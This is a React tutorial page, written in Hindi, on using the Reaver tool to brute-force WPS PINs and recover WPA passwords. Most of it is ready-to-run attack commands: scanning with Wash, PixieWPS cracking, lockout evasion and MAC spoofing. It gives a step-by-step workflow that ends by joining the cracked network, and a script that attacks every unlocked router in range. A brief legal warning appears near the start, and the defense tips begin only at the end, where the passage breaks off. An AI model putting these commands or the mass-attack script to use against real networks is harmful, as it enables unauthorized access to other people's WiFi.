import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Reaver() {
  return (
    <TutorialLayout
      title="reaver"
      subtitle="WPS PIN ब्रूट फोर्स अटैक — WPA पासवर्ड निकालने का टूल"
      icon="📡"
      prev={{ to: '/tools', label: 'All Tools' }}
      next={{ to: '/tool/netcat', label: 'netcat' }}
    >
      <h2>What is Reaver?</h2>
      <p>
        Reaver एक शक्तिशाली WPS (WiFi Protected Setup) PIN ब्रूट फोर्स अटैक टूल है जो WPS इनेबल्ड राउटर्स का 8-डिजिट PIN क्रैक करके WPA/WPA2 पासवर्ड सीधे निकाल सकता है। यह टूल WiFi सिक्योरिटी टेस्टिंग में सबसे प्रभावी हथियारों में से एक है क्योंकि WPS प्रोटोकॉल में मूलभूत डिज़ाइन कमज़ोरी है — PIN वेरिफिकेशन में आधा PIN पहले और आधा बाद में चेक होता है, जिससे कुल 11,000 कॉम्बिनेशन्स ही ट्राई करने पड़ते हैं। यह बहुत कम है — ब्रूट फोर्स आसान है।
      </p>
      <p>
        Reaver Craig Heffner ने 2011 में बनाया था। यह C भाषा में लिखा गया है और Linux के लिए डिज़ाइन किया गया है। यह काली लिनक्स और काली नेटहंटर दोनों में प्री-इंस्टॉल्ड आता है। Reaver का सबसे बड़ा फायदा यह है कि अगर राउटर WPS इनेबल्ड है तो पासवर्ड मिलना लगभग पक्का है — बस समय की बात है। PixieWPS के साथ कॉम्बिनेशन में यह सेकंड्स में पासवर्ड निकाल सकता है। Reaver C भाषा में लिखा गया है जो इसे बहुत तेज़ और मेमोरी-एफिशिएंट बनाता है। यह Linux, Kali Linux, Kali NetHunter सभी पर चलता है।
      </p>
      <p>
        WPS एक कन्वीनियंस फीचर है जिससे बिना पासवर्ड के वाईफाई से कनेक्ट हो सकते हैं — 8 डिजिट PIN से। प्रॉब्लम यह है कि इस PIN को ब्रूट फोर्स किया जा सकता है। Reaver हर PIN ट्राई करता है जब तक सही PIN न मिल जाए। एक बार सही PIN मिल जाए, तो राउटर WPA/WPA2 पासवर्ड भी रिवील कर देता है। यह अटैक WPS की मूलभूत डिज़ाइन कमज़ोरी पर आधारित है। WPS Alliance ने 2012 में PIN-based method को deprecated कर दिया, लेकिन आज भी बहुत सारे डिवाइसेस इसे सपोर्ट करते हैं।
      </p>
      <p>
        Reaver सिर्फ एक PIN ब्रूट फोर्स टूल नहीं है — यह पूरा WPS exploitation framework है। इसमें WPS स्कैनिंग (Wash), ऑफ़लाइन PIN क्रैकिंग (PixieWPS), लॉकआउट हैंडलिंग, और एन्क्रिप्शन रिकवरी सब शामिल है। WiFi सिक्योरिटी ऑडिट में Reaver एक essential tool है। यह बताता है कि राउटर का WPS कितना सुरक्षित है और क्या कोई अटैकर इसका फायदा उठा सकता है। Reaver का मॉड्यूलर आर्किटेक्चर इसे बहुत लचीला बनाता है। हर कॉम्पोनेंट (Wash, Reaver, PixieWPS) अलग-अलग काम करता है।
      </p>
      <p>
        आज भी बहुत सारे राउटर्स WPS इनेबल्ड आते हैं — खासकर पुराने मॉडल्स में। कई ISP अपने राउटर्स में WPS डिफ़ॉल्ट रूप से ऑन रखते हैं। यह एक गंभीर सुरक्षा जोखिम है जिसके बारे में ज़्यादातर लोगों को पता नहीं होता। Reaver इसी जोखिम को demonstrate करने के लिए इस्तेमाल होता है। सिक्योरिटी रिसर्चर्स और पेनेट्रेशन टेस्टर्स इसे अपने toolkit में ज़रूर रखते हैं।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> केवल अपने वाईफाई नेटवर्क पर ही इस्तेमाल करें। बिना अनुमति के किसी भी वाईफाई नेटवर्क पर WPS अटैक अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत इसमें 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है। केवल शैक्षिक उद्देश्यों के लिए ही इसका उपयोग करें। अपने राउटर पर WPS डिसेबल करना सबसे अच्छा बचाव है।
      </div>

      <h2>History of Reaver</h2>
      <p>
        Reaver को Craig Heffner ने 2011 में बनाया था जब उन्होंने WPS प्रोटोकॉल में गंभीर कमज़ोरी खोजी। उन्होंने Black Hat कॉन्फ़्रेंस में इस कमज़ोरी को प्रस्तुत किया और Reaver टूल रिलीज़ किया। यह तुरंत लोकप्रिय हो गया क्योंकि इससे पता चला कि WPS इनेबल्ड राउटर्स का पासवर्ड निकालना बहुत आसान है।
      </p>
      <p>
        बाद में Reaver-wps-fork-t6x नाम से एक बेहतर वर्जन आया जिसमें कई सुधार किए गए — बेहतर एरर हैंडलिंग, PixieWPS सपोर्ट, और लॉकआउट हैंडलिंग। आज यही वर्जन काली लिनक्स में इस्तेमाल होता है। 2014 में Dominique Bongard ने PixieWPS अटैक प्रस्तुत किया जिसने Reaver को और भी शक्तिशाली बना दिया।
      </p>
      <p>
        Reaver के आने के बाद WiFi सिक्योरिटी में बड़ा बदलाव आया। बहुत सारे राउटर निर्माताओं ने WPS लॉकआउट मेकेनिज़्म बेहतर किया। कुछ ने WPS को डिफ़ॉल्ट रूप से डिसेबल कर दिया। लेकिन आज भी बहुत सारे पुराने राउटर्स इस कमज़ोरी के साथ चल रहे हैं। WiFi Alliance ने 2012 में WPS के PIN-based method को deprecated कर दिया, लेकिन आज भी बहुत सारे डिवाइसेस इसे सपोर्ट करते हैं।
      </p>

      <h2>How Reaver Works?</h2>
      <p>
        Reaver WPS प्रोटोकॉल की कमज़ोरी का फायदा उठाता है। WPS में 8-डिजिट PIN होता है लेकिन वेरिफिकेशन दो चरणों में होता है — पहले 4 डिजिट, फिर बाकी 4 डिजिट। इसका मतलब है कि कुल 10^4 + 10^4 = 11,000 कॉम्बिनेशन्स ही ट्राई करने पड़ते हैं। यह बहुत कम है — ब्रूट फोर्स आसान है। हर अटेम्प्ट में ~10 सेकंड लगते हैं। अधिकतम समय = 11,000 x 10 = ~30 घंटे। औसत समय = ~15 घंटे (यदि लॉकआउट न हो)। PixieWPS के साथ सेकंड्स में PIN मिल सकता है।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">M1-M2 Exchange:</strong> Reaver WPS M1 मैसेज भेजता है, राउटर M2 से जवाब देता है</li>
        <li><strong className="text-white">M3-M4 Exchange:</strong> PIN का पहला भाग (4 डिजिट) वेरिफाई होता है</li>
        <li><strong className="text-white">M5-M6 Exchange:</strong> PIN का दूसरा भाग (4 डिजिट) वेरिफाई होता है</li>
        <li><strong className="text-white">M7 Exchange:</strong> सही PIN मिलने पर राउटर WPA पासवर्ड रिवील करता है</li>
        <li><strong className="text-white">NACK Handling:</strong> गलत PIN पर NACK मैसेज आता है — इससे पता चलता है कि कौन सा हिस्सा गलत है</li>
        <li><strong className="text-white">Rate Limiting:</strong> कुछ राउटर्स लॉकआउट लगाते हैं — Reaver इससे बचने के लिए डिले और NACK स्किप यूज़ करता है</li>
        <li><strong className="text-white">Checksum Validation:</strong> 8वां डिजिट checksum है — इससे 1,000 कॉम्बिनेशन्स बच जाते हैं</li>
        <li><strong className="text-white">Session Management:</strong> हर अटेम्प्ट में EAPOL exchange होता है — Reaver इसे manage करता है</li>
      </ul>
      <CodeBlock
        title="WPS PIN Verification Process"
        code={`# WPS PIN 8 डिजिट का होता है (12345670 जैसा)
# लेकिन वेरिफिकेशन दो भागों में होता है:

# भाग 1: पहले 4 डिजिट (1234)
# → 10,000 कॉम्बिनेशन्स (0000-9999)

# भाग 2: बाकी 4 डिजिट (5670)
# → 1,000 कॉम्बिनेशन्स (000-999, आखिरी डिजिट checksum)
# → वास्तव में सिर्फ 1,000 कॉम्बिनेशन्स

# कुल = 10,000 + 1,000 = 11,000 कॉम्बिनेशन्स
# यह बहुत कम है — ब्रूट फोर्स आसान!

# हर अटेम्प्ट में ~10 सेकंड लगते हैं
# अधिकतम समय = 11,000 x 10 = ~30 घंटे
# औसत समय = ~15 घंटे (यदि लॉकआउट न हो)

# WPS Message Exchange Flow:
# Client → M1 (Enrollee Nonce, UUID) → Router
# Client ← M2 (Registrar Nonce, UUID) ← Router
# Client → M3 (E-Hash1, E-Hash2) → Router
# Client ← M4 (R-Hash1, R-Hash2) ← Router
# Client → M5 (E-Nonce, Encrypted Settings) → Router
# Client ← M6 (R-Nonce, Encrypted Settings) ← Router
# Client → M7 (M7D) → Router
# Client ← M8 (Network Key) ← Router  ← पासवर्ड यहाँ मिलता है!`}
      />

      <h2>Installation</h2>
      <p>
        काली नेटहंटर में Reaver पहले से इंस्टॉल्ड आता है। अगर किसी कारण से नहीं है तो आसानी से इंस्टॉल कर सकते हैं।
      </p>
      <CodeBlock
        title="Reaver इंस्टॉलेशन"
        code={`# काली लिनक्स/नेटहंटर में (पहले से है चेक करें):
reaver --version

# Debian/Ubuntu में इंस्टॉल:
sudo apt update
sudo apt install reaver

# सोर्स से बिल्ड (नवीनतम वर्जन):
git clone https://github.com/t6x/reaver-wps-fork-t6x.git
cd reaver-wps-fork-t6x/src
./configure
make
sudo make install

# वर्जन चेक:
reaver --version

# सहायता:
reaver --help

# Wash (WPS scanner) भी साथ में इंस्टॉल होता है:
wash --version`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-i</td><td className="py-2 px-3">मॉनिटर मोड इंटरफेस स्पेसिफाई करें</td><td className="py-2 px-3 font-mono text-xs">-i wlan0mon</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-b</td><td className="py-2 px-3">टार्गेट राउटर का BSSID (MAC)</td><td className="py-2 px-3 font-mono text-xs">-b AA:BB:CC:DD:EE:FF</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c</td><td className="py-2 px-3">स्पेसिफिक चैनल</td><td className="py-2 px-3 font-mono text-xs">-c 6</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-K 1</td><td className="py-2 px-3">PixieWPS ऑफ़लाइन अटैक मोड</td><td className="py-2 px-3 font-mono text-xs">-K 1</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-vv</td><td className="py-2 px-3">वर्बोज़ आउटपुट (बहुत डिटेल)</td><td className="py-2 px-3 font-mono text-xs">-vv</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-d</td><td className="py-2 px-3">अटेम्प्ट्स के बीच डिले (सेकंड)</td><td className="py-2 px-3 font-mono text-xs">-d 5</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-l</td><td className="py-2 px-3">लॉकआउट पर वेट टाइम (सेकंड)</td><td className="py-2 px-3 font-mono text-xs">-l 300</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-N</td><td className="py-2 px-3">NACK स्किप (लॉकआउट से बचें)</td><td className="py-2 px-3 font-mono text-xs">-N</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-L</td><td className="py-2 px-3">लॉकआउट के बाद भी इग्नोर करें</td><td className="py-2 px-3 font-mono text-xs">-L</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-r</td><td className="py-2 px-3">रिट्री काउंट (डिफ़ॉल्ट 3)</td><td className="py-2 px-3 font-mono text-xs">-r 5</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-t</td><td className="py-2 px-3">रिस्पॉन्स टाइमआउट (सेकंड)</td><td className="py-2 px-3 font-mono text-xs">-t 5</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-T</td><td className="py-2 px-3">M5/M7 टाइमआउट</td><td className="py-2 px-3 font-mono text-xs">-T 0.5</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-o</td><td className="py-2 px-3">आउटपुट फाइल</td><td className="py-2 px-3 font-mono text-xs">-o results.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-p</td><td className="py-2 px-3">स्पेसिफिक PIN से शुरू करें</td><td className="py-2 px-3 font-mono text-xs">-p 12345670</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">-A</td><td className="py-2 px-3">डिफ़ॉल्ट ESSID स्पेसिफाई</td><td className="py-2 px-3 font-mono text-xs">-A</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Monitor Mode Setup</h2>
      <p>
        Reaver इस्तेमाल करने से पहले WiFi एडाप्टर को मॉनिटर मोड में लाना होता है। यह ज़रूरी है क्योंकि Reaver कच्चे WiFi फ्रेम्स भेजता है।
      </p>
      <CodeBlock
        title="मॉनिटर मोड इनेबल करें"
        code={`# WiFi एडाप्टर को मॉनिटर मोड में लाएं:
sudo airmon-ng start wlan0

# इंटरफेस नाम बदलेगा: wlan0 → wlan0mon
# चेक करें:
iwconfig

# मैनुअल तरीका (अगर airmon-ng काम न करे):
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up

# अगर processes interfere कर रहे हैं:
sudo airmon-ng check kill
# (NetworkManager और wpa_supplicant बंद होंगे)

# मॉनिटर मोड वेरिफाई करें:
iwconfig wlan0mon
# Mode:Monitor दिखना चाहिए

# मॉनिटर मोड बंद करें:
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager`}
      />

      <h2>Target Discovery with Wash</h2>
      <p>
        Wash एक WPS स्कैनर है जो Reaver के साथ आता है। यह WPS इनेबल्ड राउटर्स ढूंढता है और उनकी WPS स्टेटस दिखाता है। Wash बहुत उपयोगी है क्योंकि यह बताता है कि कौन-सा राउटर WPS इनेबल्ड है और कौन-सा लॉक्ड है। यह Reaver से पहले रन करना ज़रूरी है।
      </p>
      <CodeBlock
        title="WPS Targets ढूंढें"
        code={`# WPS इनेबल्ड राउटर्स स्कैन करें:
sudo wash -i wlan0mon

# आउटपुट:
# BSSID              Channel  WPS Version  WPS Locked  ESSID
# AA:BB:CC:DD:EE:FF  6        1.0          No          HomeWiFi
# 11:22:33:44:55:66  11       2.0          Yes         OfficeWiFi

# WPS Locked = No → अटैक संभव है
# WPS Locked = Yes → लॉक्ड है, बाद में ट्राई करें

# स्पेसिफिक चैनल स्कैन करें:
sudo wash -i wlan0mon -c 6

# सभी चैनल्स स्कैन करें:
sudo wash -i wlan0mon -a

# वर्बोज़ आउटपुट:
sudo wash -i wlan0mon -j

# फ़िल्टर: सिर्फ अनलॉक्ड राउटर्स:
sudo wash -i wlan0mon | grep "No"

# आउटपुट फाइल में सेव:
sudo wash -i wlan0mon -o wash_results.txt`}
      />

      <h2>Basic Usage</h2>
      <p>
        Reaver का बेसिक इस्तेमाल सरल है — मॉनिटर मोड इंटरफेस और टार्गेट BSSID दो।
      </p>
      <CodeBlock
        title="बेसिक Reaver Commands"
        code={`# सबसे सरल अटैक:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF

# वर्बोज़ आउटपुट (डिटेल देखने के लिए):
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# स्पेसिफिक चैनल (तेज़):
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6

# डिले के साथ (लॉकआउट से बचें):
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5

# लॉकआउट वेट:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -l 300

# आउटपुट फाइल में सेव:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -o results.txt

# डिफ़ॉल्ट ESSID के साथ:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -e HomeWiFi`}
      />

      <h2>WPS PIN Attack (Detailed)</h2>
      <p>
        Reaver का मुख्य अटैक बहुत सरल है — PIN ब्रूट फोर्स। हर PIN ट्राई करो जब तक सही न मिल जाए।
      </p>
      <CodeBlock
        title="WPS PIN अटैक वेरिएंट्स"
        code={`# बेसिक अटैक:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# NACK स्किप के साथ (कुछ राउटर्स पर बेहतर):
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -N

# लॉकआउट इग्नोर के साथ:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -L

# स्पेसिफिक PIN से शुरू (पहले से कुछ पता हो तो):
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 50000000
# 50000000 से शुरू होगा

# रिट्री बढ़ाएं:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -r 5

# कम टाइमआउट (तेज़ लेकिन मिस हो सकता है):
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -t 3 -T 0.3`}
      />

      <h2>PixieWPS Integration</h2>
      <p>
        PixieWPS एक ऑफ़लाइन अटैक है जो सेकंड्स में WPS PIN क्रैक कर सकता है। यह कुछ राउटर्स की PRNG (Pseudo Random Number Generator) कमज़ोरी का फायदा उठाता है।
      </p>
      <CodeBlock
        title="PixieWPS अटैक (सेकंड्स में)"
        code={`# PixieWPS — ऑफ़लाइन PIN क्रैक:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1

# -K 1 = PixieWPS मोड
# अगर राउटर वल्नरेबल है तो सेकंड्स में PIN मिलेगा

# आउटपुट:
# [+] WPS PIN: 12345670
# [+] WPA PSK: MySecretPassword
# [+] AP SSID: HomeWiFi

# PixieWPS इन चिपसेट्स पर काम करता है:
# - Ralink/MediaTek (सबसे ज़्यादा वल्नरेबल)
# - Realtek (कुछ मॉडल्स)
# - Broadcom (कुछ मॉडल्स)
# - Atheros (कुछ पुराने मॉडल्स)

# PixieWPS + verbose:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv

# अगर PixieWPS काम नहीं करता:
# "PixieWPS attack failed" → नॉर्मल Reaver अटैक ट्राई करें`}
      />

      <h2>Complete Attack Workflow</h2>
      <CodeBlock
        title="स्टेप-बाय-स्टेप अटैक"
        code={`# स्टेप 1: WiFi एडाप्टर को मॉनिटर मोड में लाएं
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# स्टेप 2: WPS राउटर्स स्कैन करें
sudo wash -i wlan0mon

# आउटपुट में WPS Locked = No वाले राउटर्स चुनें

# स्टेप 3: पहले PixieWPS ट्राई करें (तेज़)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv

# अगर PIN मिल गया → डन!
# अगर "PixieWPS attack failed" → स्टेप 4 पर जाएं

# स्टेप 4: नॉर्मल Reaver अटैक (धीमा लेकिन काम करता है)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 5 -l 300

# स्टेप 5: पासवर्ड मिलने पर कनेक्ट करें
wpa_passphrase HomeWiFi MySecretPassword > wifi.conf
wpa_supplicant -B -i wlan0 -c wifi.conf
dhclient wlan0`}
      />

      <h2>WPS Lockout Handling</h2>
      <p>
        बहुत से राउटर्स WPS लॉकआउट इस्तेमाल करते हैं — बहुत अटेम्प्ट्स के बाद PIN टेम्परेरिली लॉक हो जाता है।
      </p>
      <CodeBlock
        title="लॉकआउट से कैसे बचें"
        code={`# डिले बढ़ाएं (अटेम्प्ट्स के बीच गैप):
sudo reaver -i wlan0mon -b BSSID -d 10

# लॉकआउट डिटेक्ट करने पर वेट करें:
sudo reaver -i wlan0mon -b BSSID -l 600

# NACK स्किप (कुछ राउटर्स पर काम करता है):
sudo reaver -i wlan0mon -b BSSID -N

# लॉकआउट के बाद भी ट्राई करें:
sudo reaver -i wlan0mon -b BSSID -L

# रिट्री काउंट कम करें:
sudo reaver -i wlan0mon -b BSSID -r 1

# मैनुअल तरीका:
# लॉकआउट होने पर 15-30 मिनट वेट करें
# फिर दोबारा ट्राई करें
# कुछ राउटर्स 24 घंटे तक लॉक रहते हैं

# कुछ राउटर्स पर रीस्टार्ट से लॉक हटता है:
# राउटर को पावर ऑफ/ऑन करें (अगर अपना है)`}
      />

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="Automated WPS Attack Script"
        code={`#!/bin/bash
# ऑटोमेटेड WPS अटैक स्क्रिप्ट

INTERFACE="wlan0mon"
RESULTS_DIR="/tmp/reaver_results"
mkdir -p $RESULTS_DIR

# मॉनिटर मोड इनेबल करें
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sleep 3

echo "[+] WPS राउटर्स स्कैन कर रहे हैं..."
sudo wash -i $INTERFACE -o $RESULTS_DIR/wash.txt 2>/dev/null &
WASH_PID=$!
sleep 30
kill $WASH_PID 2>/dev/null

# अनलॉक्ड राउटर्स पर अटैक करें
while read line; do
    BSSID=$(echo "$line" | awk '{print $1}')
    CHANNEL=$(echo "$line" | awk '{print $2}')
    ESSID=$(echo "$line" | awk '{print $NF}')
    LOCKED=$(echo "$line" | awk '{print $5}')

    if [ "$LOCKED" = "No" ]; then
        echo "[+] अटैक कर रहे हैं: $ESSID ($BSSID)"

        # पहले PixieWPS ट्राई करें
        echo "[+] PixieWPS ट्राई कर रहे हैं..."
        sudo timeout 120 reaver -i $INTERFACE -b $BSSID -c $CHANNEL -K 1 -vv > $RESULTS_DIR/pixie_\${BSSID}.txt 2>&1

        if grep -q "WPS PIN" $RESULTS_DIR/pixie_\${BSSID}.txt; then
            echo "[+] PixieWPS में सफल! $ESSID"
            cat $RESULTS_DIR/pixie_\${BSSID}.txt | grep -E "PIN|PSK|SSID"
        else
            echo "[+] नॉर्मल Reaver अटैक..."
            sudo reaver -i $INTERFACE -b $BSSID -c $CHANNEL -vv -d 5 -l 300 -o $RESULTS_DIR/reaver_\${BSSID}.txt
        fi
    fi
done < $RESULTS_DIR/wash.txt`}
      />

      <CodeBlock
        title="WiFi Adapter Monitor Script"
        code={`#!/bin/bash
# WiFi एडाप्टर सेटअप स्क्रिप्ट

INTERFACE=$1

if [ -z "$INTERFACE" ]; then
    echo "Usage: $0 <interface>"
    echo "Example: $0 wlan0"
    exit 1
fi

# Interfering processes बंद करें
echo "[+] Interfering processes बंद कर रहे हैं..."
sudo airmon-ng check kill

# Monitor mode इनेबल करें
echo "[+] $INTERFACE को monitor mode में ला रहे हैं..."
sudo airmon-ng start $INTERFACE

# वेरिफाई करें
MONITOR="\${INTERFACE}mon"
if iwconfig $MONITOR 2>/dev/null | grep -q "Mode:Monitor"; then
    echo "[+] Monitor mode सफल: $MONITOR"
else
    echo "[-] Monitor mode फेल! Manual try करें:"
    echo "    sudo ifconfig $INTERFACE down"
    echo "    sudo iwconfig $INTERFACE mode monitor"
    echo "    sudo ifconfig $INTERFACE up"
    exit 1
fi

# WPS scan
echo "[+] WPS राउटर्स स्कैन कर रहे हैं (30 सेकंड)..."
sudo timeout 30 wash -i $MONITOR 2>/dev/null`}
      />

      <h2>Reaver vs Bully vs Wifite vs PixieWPS</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Reaver</th>
              <th className="text-left py-2 px-3 text-neon-green">Bully</th>
              <th className="text-left py-2 px-3 text-neon-green">Wifite</th>
              <th className="text-left py-2 px-3 text-neon-green">PixieWPS</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">मुख्य काम</td><td className="py-2 px-3">WPS PIN ब्रूट फोर्स</td><td className="py-2 px-3">WPS PIN ब्रूट फोर्स</td><td className="py-2 px-3">ऑटोमेटेड WiFi अटैक</td><td className="py-2 px-3">ऑफ़लाइन WPS PIN</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">PixieWPS</td><td className="py-2 px-3">हाँ (-K 1)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ (integrated)</td><td className="py-2 px-3">सिर्फ PixieWPS</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">स्पीड</td><td className="py-2 px-3">मीडियम</td><td className="py-2 px-3">तेज़</td><td className="py-2 px-3">ऑटो</td><td className="py-2 px-3">सेकंड्स</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">लॉकआउट हैंडलिंग</td><td className="py-2 px-3">अच्छी (-d, -l)</td><td className="py-2 px-3">बेहतर</td><td className="py-2 px-3">ऑटो</td><td className="py-2 px-3">N/A</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">CLI/GUI</td><td className="py-2 px-3">CLI</td><td className="py-2 px-3">CLI</td><td className="py-2 px-3">CLI (menu)</td><td className="py-2 px-3">CLI</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">भाषा</td><td className="py-2 px-3">C</td><td className="py-2 px-3">C</td><td className="py-2 px-3">Python</td><td className="py-2 px-3">C</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">काली में</td><td className="py-2 px-3">प्री-इंस्टॉल्ड</td><td className="py-2 px-3">प्री-इंस्टॉल्ड</td><td className="py-2 px-3">प्री-इंस्टॉल्ड</td><td className="py-2 px-3">प्री-इंस्टॉल्ड</td></tr>
            <tr class="border-b border-dark-600"><td className="py-2 px-3 text-white">डिफ़ॉल्ट PIN</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (कुछ)</td><td className="py-2 px-3">N/A</td><td className="py-2 px-3">N/A</td></tr>
            <tr class="border-b border-dark-600"><td className="py-2 px-3 text-white">मॉनिटर मोड</td><td className="py-2 px-3">ज़रूरी</td><td className="py-2 px-3">ज़रूरी</td><td className="py-2 px-3">ऑटो</td><td className="py-2 px-3">ज़रूरी</td></tr>
            <tr><td className="py-2 px-3 text-white">बेस्ट फॉर</td><td className="py-2 px-3">WPS testing</td><td className="py-2 px-3">तेज़ WPS attack</td><td className="py-2 px-3">WiFi audit</td><td className="py-2 px-3">Quick PIN crack</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'WPS Locked = Yes दिखा रहा है', a: 'राउटर ने WPS लॉक कर दिया है। 15-30 मिनट वेट करें। कुछ राउटर्स 24 घंटे तक लॉक रहते हैं। -L फ्लैग से लॉकआउट के बाद भी ट्राई कर सकते हो। राउटर रीस्टार्ट करने पर लॉक हट सकता है।' },
          { q: 'कनेक्शन बार-बार ड्रॉप हो रहा है', a: 'एडाप्टर को टार्गेट राउटर के करीब ले जाएं। चैनल सही है या नहीं चेक करें (-c 6)। एंटेना बदलें। दूसरा WiFi एडाप्टर ट्राई करें (Alfa AWUS036ACH अच्छा है)।' },
          { q: 'PixieWPS काम नहीं कर रहा', a: 'PixieWPS सभी राउटर्स पर काम नहीं करता। नए राउटर्स में यह फिक्स है। नॉर्मल Reaver अटैक ट्राई करें। राउटर का चिपसेट चेक करें — Ralink/MediaTek सबसे ज़्यादा वल्नरेबल हैं।' },
          { q: 'बहुत धीमा चल रहा है', a: 'डिले कम करें (-d 1)। चैनल स्पेसिफाई करें (-c 6)। टार्गेट के करीब जाएं। लेकिन बहुत तेज़ करने पर लॉकआउट हो सकता है — बैलेंस रखें।' },
          { q: 'Monitor mode नहीं हो रहा', a: 'WiFi एडाप्टर मॉनिटर मोड सपोर्ट करता है? airmon-ng check kill से interfering processes बंद करें। दूसरा एडाप्टर ट्राई करें। USB WiFi एडाप्टर बेहतर काम करते हैं।' },
          { q: '"Failed to associate" error आ रहा है', a: 'राउटर MAC फ़िल्टरिंग कर रहा होगा। -N फ्लैग ट्राई करें। चैनल बदलें। मैक एड्रेस बदलें: sudo macchanger -r wlan0mon' },
          { q: 'WPS M1 मैसेज नहीं भेज पा रहा', a: 'WiFi एडाप्टर पैकेट इंजेक्शन सपोर्ट नहीं कर रहा। aireplay-ng --test wlan0mon से चेक करें। दूसरा एडाप्टर ट्राई करें।' },
          { q: 'बहुत कम PIN ट्राई हो रहे हैं फिर रुक जाता है', a: 'राउटर ने WPS लॉक कर दिया है। -l 600 से वेट टाइम बढ़ाएं। राउटर रीस्टार्ट करें। -d 10 से डिले बढ़ाएं।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Reaver अटैक से कैसे बचें (राउटर ओनर्स के लिए):
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">WPS डिसेबल करें:</strong> राउटर सेटिंग्स में WPS बंद कर दें — यह सबसे अच्छा बचाव है</li>
        <li><strong className="text-white">WPS लॉकआउट इनेबल करें:</strong> कुछ राउटर्स में यह ऑप्शन होता है — गलत PIN पर लॉक हो जाएगा</li>
        <li><strong className="text-white">फ़र्मवेयर अपडेट करें:</strong> नए फ़र्मवेयर में WPS लॉकआउट बेहतर होता है</li>
        <li><strong className="text-white">MAC फ़िल्टरिंग:</strong> सिर्फ जाने-पहचाने डिवाइसेस को कनेक्ट करने दें</li>
        <li><strong className="text-white">WIDS/WIPS:</strong> Wireless Intrusion Detection System — Reaver अटैक डिटेक्ट करता है</li>
